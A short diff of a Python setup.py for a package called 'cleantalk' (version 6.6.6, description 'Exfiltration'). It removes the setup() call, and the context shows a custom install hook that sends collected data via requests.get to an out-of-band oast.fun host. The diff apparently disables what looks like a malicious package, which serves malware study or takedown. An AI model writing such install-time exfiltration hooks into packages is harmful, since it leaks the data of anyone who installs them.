@@ -15,10 +15,4 @@ class CustomInstall(install):
         requests.get("https://cj4cpwk2vtc0000ep3s0gjngmqeyyyyyb.oast.fun",params = ploads)
 
 
-setup(name='cleantalk',
-      version='6.6.6',
-      description='Exfiltration',
-      author='chawla',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                         
